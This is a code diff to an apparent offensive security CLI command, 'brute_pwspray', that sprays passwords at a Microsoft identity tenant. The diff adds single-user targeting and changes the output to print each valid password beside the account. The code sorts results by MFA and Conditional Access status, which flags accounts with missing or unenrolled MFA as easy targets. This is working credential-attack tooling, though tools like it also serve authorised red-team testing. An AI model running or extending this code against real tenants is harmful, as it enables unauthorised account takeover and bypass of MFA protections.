@@ -26,7 +26,8 @@ def _read_lines(path_str: str) -> list:
 @handle_cli_errors
 def brute_pwspray(
     tenant:      str = typer.Option(None, "-t", "--tenant", help="Tenant ID (will be cached upon explicit use)"),
-    userlist:    str = typer.Option(..., "-u", "--upn", help="File of userPrincipalNames, one per line"),
+    user:        str = typer.Option(None, "-u", "--upn", help="Single userPrincipalName to spray (use this or --userlist)"),
+    userlist:    str = typer.Option(None, "-U", "--userlist", help="File of userPrincipalNames, one per line"),
     password:    str = typer.Option(None, "-p", "--password", help="A single password to spray (use this or --passwords)"),
     passwords:   str = typer.Option(None, "-P", "--passwords", help="File of passwords, one per line, each sprayed as its own round"),
     client_id:   str = typer.Option(..., "-c", "--client-id", help="Client ID to authenticate with (will be cached upon explicit use)"),
@@ -44,12 +45,19 @@ def brute_pwspray(
     tenant = require_tenant(tenant, console)
     resource_url = MFA_SWEEP_RESOURCES.get(resource, resource)
 
+    if bool(user) == bool(userlist):
+        console.print("[bold red][-][/] Provide exactly one of --upn or --userlist")
+        raise typer.Exit(1)
+
     if bool(password) == bool(passwords):
         console.print("[bold red][-][/] Provide exactly one of --password or --passwords")
         raise typer.Exit(1)
 
     try:
-        candidates = _read_lines(userlist)
+        if user:
+            candidates = [user]
+        else:
+            candidates = _read_lines(userlist)
         spray_passwords = [password] if password else _read_lines(passwords)
     except FileNotFoundError as e:
         console.print(f"[bold red][-][/] File not found: {e}")
@@ -106,22 +114,22 @@ def brute_pwspray(
 
             if status == "gap_no_mfa":
                 solved[upn] = (pw, "valid, no MFA challenge")
-                console.print(f"[bold green][+][/] VALID: {upn}. Authenticated with no MFA challenge")
+                console.print(f"[bold green][+][/] VALID: {upn}. Authenticated with no MFA challenge: {pw}")
                 continue
 
             if status == "gap_unenrolled":
                 solved[upn] = (pw, "valid, MFA required but not enrolled")
-                console.print(f"[bold green][+][/] VALID: {upn}. Password correct, MFA required but not enrolled")
+                console.print(f"[bold green][+][/] VALID: {upn}. Password correct, MFA required but not enrolled: {pw}")
                 continue
 
             if status == "expected_mfa":
                 solved[upn] = (pw, "valid, MFA enforced")
-                console.print(f"[bold green][+][/] VALID: {upn}. Password correct, MFA enforced")
+                console.print(f"[bold green][+][/] VALID: {upn}. Password correct, MFA enforced: {pw}")
                 continue
 
             if status == "expected_ca":
                 solved[upn] = (pw, "valid, blocked by Conditional Access")
-                console.print(f"[bold green][+][/] VALID: {upn}. Password correct, blocked by Conditional Access")
+                console.print(f"[bold green][+][/] VALID: {upn}. Password correct, blocked by Conditional Access: {pw}")
                 continue
 
             if status == "fatal_wrong_password":
@@ -130,12 +138,12 @@ def brute_pwspray(
 
             if status == "gap_expired":
                 solved[upn] = (pw, "valid, password expired (must be changed)")
-                console.print(f"[bold green][+][/] VALID: {upn}. Password correct, account requires password change")
+                console.print(f"[bold green][+][/] VALID: {upn}. Password correct, account requires password change: {pw}")
                 continue
 
             if status == "gap_disabled":
                 solved[upn] = (pw, "valid, account disabled")
-                console.print(f"[bold green][+][/] VALID: {upn}. Password correct, account is disabled")
+                console.print(f"[bold green][+][/] VALID: {upn}. Password correct, account is disabled: {pw}")
                 continue
             
             if status == "fatal_account_missing":
